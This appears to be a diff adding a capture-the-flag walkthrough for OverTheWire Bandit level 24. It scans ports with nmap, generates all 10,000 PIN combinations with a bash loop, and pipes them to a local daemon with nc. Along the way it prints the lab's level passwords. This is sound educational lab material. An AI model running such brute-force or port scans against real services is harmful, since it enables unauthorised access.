@@ -1,0 +1,105 @@
+Level Goal
+A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode.
+There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
+
+Essentially, a Brute Force attack is a cryptographic hack.
+Also known as an Exhaustive Search, it relies on calculating and submitting every possible password combination with the hope of eventually guessing correctly.
+The attacker systematically checks all possible passwords and passphrases until the correct one is found.
+
+As the password’s length increases, the amount of time, on average, to find the correct password increases exponentially.
+Therefore, a Brute Force attack can be time consuming, difficult to implement if methods such as Data Obfuscation are used, and at times it is impossible to crack.
+
+Nonetheless, if weak passwords were used, it could merely take seconds to break with little effort.
+Hence, this is why it is important to develop healthy password habits and implement it.
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+[# Step 1]
+>  ~ ssh bandit24@bandit.labs.overthewire.org -p 2220
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+bandit24@bandit.labs.overthewire.org's password:
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+[# Step 2]
+bandit24@bandit:~$ nmap -p- localhost
+Starting Nmap 7.40 ( https://nmap.org ) at 2020-07-05 12:57 CEST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00022s latency).
+Not shown: 65523 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+113/tcp   open  ident
+30000/tcp open  ndmps
+30001/tcp open  pago-services1
+30002/tcp open  pago-services2
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
+33163/tcp open  unknown
+43851/tcp open  unknown
+Nmap done: 1 IP address (1 host up) scanned in 2.95 seconds
+
+[# Step 3]
+bandit24@bandit:~$ mkdir /tmp/myBandit24
+
+[# Step 4]
+bandit24@bandit:~$ cd /tmp/myBandit24
+
+[# Step 5]
+bandit24@bandit:/tmp/myBandit24$ vim index.sh
+--------------------------------------------------------------------------------------
+Inside Vim’s Editor:
+
+1 #!/bin/bash
+2
+3 for i in {0000..9999}; do
+4     echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt
+5 done
+~
+~
+/tmp/myBandit24/index.sh [dec= 35] [hex=23] [pos=0001:0001][20% of 5]
+:wq
+----------------------------------------------------------------------------------------
+After exiting Vim’s Editor:
+
+[# Step 5 (Continued)]
+bandit24@bandit:/tmp/myBandit24$ cat index.sh
+#!/bin/bash
+for i in {0000..9999}; do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt
+done
+
+[# Step 6]
+bandit24@bandit:/tmp/myBandit24$ chmod +x index.sh
+
+[# Step 7]
+bandit24@bandit:/tmp/myBandit24$ ./index.sh
+
+[# Step 8]  Optional
+bandit24@bandit:/tmp/myBandit24$ more combinations.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
+[...]
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0047
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0048
+--More--(0%)                            # Press Crtl + C to quit
+
+[# Step 9]
+bandit24@bandit:/tmp/myBandit24$ cat combinations.txt | nc localhost 30002 >> result.txt
+
+[# Step 10]
+bandit24@bandit:/tmp/myBandit24$ sort result.txt | uniq -u
+Correct!
+Exiting.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+[# Step 11]
+bandit24@bandit:/tmp/myBandit24$ rm -rf /tmp/myBandit24
+
+[# Step 12]
+bandit24@bandit:/tmp/myBandit24$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
